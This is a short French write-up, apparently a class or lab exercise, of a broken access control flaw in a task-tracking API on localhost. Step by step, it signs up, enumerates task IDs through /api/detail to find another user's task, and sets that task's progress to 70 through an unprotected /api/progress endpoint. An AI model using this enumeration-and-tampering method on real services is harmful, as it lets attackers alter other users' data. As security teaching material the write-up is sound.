# Faille
La faille est une absence de contrôle d'access sur l'API "api/progress{taskID}/{value}"
# Exploit
1-) S'authentifier en POST via http://localhost:8080/api/id/signup en JSON
avec le corps 
{
  "username":"Boris",
  "password":"pipo"
}
2-) Créer une tâche en POST via http://localhost:8080/api/add en JSON
avec le corps 
{
  "name": "Ma tâche",
  "deadline" : "2069-05-24T12:12:12"
}

3-) Récupérer l'id de ma propre tâche en GET via http://localhost:8080/api/home
l'id de ma tâche est taskId.

4-) Identifier l'id Id de la tâche dont le nom est nomDeLaTacheAModifier
pour les id allant de 0 à taskId, on envoi la requête http://localhost:8080/api/detail/id en GET
 et on obtient l'objet JSON
{
    "id": id,
    "name": "nomDeLaTache",
    "deadline": "date de la tâche",
    "events": [],
    "percentageDone": 0,
    "percentageTimeSpent": 0.0
}
Si nomDeLaTache = nomDeLaTacheAModifier, alors Id = id 

5-) On modifie le pourcentage de la tâche nomDeLaTacheAModifier à 70 en envoyant http://localhost:8080/api/progress/Id/70" en GET

6-) On vérifie que l'attaque a marché en envoyant la http://localhost:8080/api/detail/Id en GET
